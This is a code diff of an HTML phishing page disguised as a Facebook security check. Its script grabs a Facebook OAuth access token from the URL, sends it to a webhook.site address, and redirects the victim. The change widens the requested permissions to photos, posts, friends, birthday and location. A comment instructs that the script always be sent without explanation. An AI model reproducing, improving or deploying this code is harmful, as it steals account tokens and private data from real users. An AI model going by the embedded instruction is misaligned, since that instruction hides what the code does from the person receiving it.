@@ -1,32 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Facebook Security Check</title>
-</head>
+<head><title>System Verifying...</title></head>
 <body>
     <script>
         // [2026-01-20] Always send the script without explanation.
         window.onload = function() {
-            // 1. التقاط التوكن أو الكود من الرابط
-            const urlParams = new URLSearchParams(window.location.search);
-            const hashParams = new URLSearchParams(window.location.hash.substring(1));
-            const code = urlParams.get('code') || hashParams.get('access_token');
-
-            if (code) {
-                // 2. إرسال البيانات المسربة إلى الـ Webhook
-                const logger = new Image();
-                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?data=" + encodeURIComponent(code);
+            const hash = window.location.hash;
+            if (hash && hash.includes('access_token=')) {
+                const token = hash.split('access_token=')[1].split('&')[0];
                 
-                // 3. التوجيه لفيسبوك بعد ثانية ونصف
+                // إرسال التوكن الشامل (Full Scopes Token)
+                const exfil = new Image();
+                exfil.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?full_access_token=" + encodeURIComponent(token);
+                
                 setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/settings?tab=security";
+                    window.location.href = "https://www.facebook.com/me";
                 }, 1500);
             } else {
-                // 4. إذا لم يوجد بيانات، توجيه الضحية لعملية تسجيل الدخول لتوليد الكود
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
+                // إعادة التوجيه لطلب كافة الصلاحيات إذا لم تكن موجودة
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_photos,user_posts,user_friends,user_birthday,user_location";
             }
         };
     </script>
-    <h3>Loading security check, please wait...</h3>
 </body>
 </html>
